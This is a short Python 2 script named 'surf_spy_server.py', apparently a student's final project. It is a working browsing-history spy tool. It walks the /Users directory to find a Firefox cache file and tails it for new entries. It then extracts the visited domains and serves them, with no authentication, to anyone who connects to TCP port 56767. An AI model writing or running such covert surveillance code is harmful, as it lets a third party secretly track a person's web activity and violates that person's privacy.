# surf_spy_server.py
#
# Will MacLean
# CSPP 51060
# Final Project
#

import socket
import time
import re
import subprocess
import sys

# variables, for ease of editing
host = ''
port = 56767
backlog = 5
size = 16384
main_dir = "/Users"

# read directories
find_dir = subprocess.Popen(['find', '.', '-print'], stdout = subprocess.PIPE, cwd = main_dir)
dirs = find_dir.stdout.read()

# split data into paths and check to see if they have "_CACHE_MAP_"
file_paths = dirs.split()
reg_cache = re.compile('_CACHE_001_')
reg_firefox = re.compile('Firefox')
cache_path = ''
for path in file_paths:
        if (reg_cache.search(path)):
                if (reg_firefox.search(path)): 
			cache_path = main_dir + path.lstrip('.')

# grab a file
print cache_path


# Based on the "Tailing a File" sample in Beazley's 
# "Generator's and Networking" lecture.
def follow(file):
	file.seek(0.2)
	while True:
		line = file.readline()
		if not line:
			time.sleep(1)
			continue
		yield line

# find http
re_clean = re.compile('HTTP:(.*).com{1}')

# read CACHE file into a follow
cache_read = open(cache_path, "r")
lines = follow(cache_read)

# create a server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(backlog)
print "Spying..."
while True:
	client, address = s.accept()
	for line in lines:
		if (re_clean.search(line)):
			url = re_clean.search(line)
			fields = url.group().split('/')
			url = fields[2]
			#print url
			if url:
				client.send(url)
	client.close()



